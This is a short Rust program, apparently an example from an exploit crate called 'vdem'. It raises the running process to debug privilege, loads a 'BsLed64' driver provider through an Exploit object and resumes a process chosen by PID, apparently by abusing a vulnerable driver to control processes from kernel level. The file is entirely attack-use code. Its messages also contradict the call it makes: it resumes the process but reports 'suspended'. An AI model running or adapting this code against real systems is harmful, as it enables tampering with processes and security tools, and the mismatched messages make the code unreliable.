use std::env;

use providers::bsled::BsLed64;
use vdem::{exploit::Exploit, process::ResumeProcess, utils::promote_privilege_to_debug_level};

fn main() {
    let args = env::args().collect::<Vec<String>>();

    if args.len() == 1 {
        panic!("Need a PID parameter to run");
    }

    let pid: u32 = u32::from_str_radix(&args[1], 10).expect("Invalid process id");

    promote_privilege_to_debug_level();

    let mut exploit = Exploit::instance().lock().unwrap();

    exploit.register_provider(Box::new(BsLed64::new()));

    exploit.select("BS_LED").unwrap();

    if let Err(e) = exploit.resume_process(pid) {
        panic!("Suspend process {pid} failed: {e}")
    } else {
        println!("process({}) suspended", pid);
    }
}
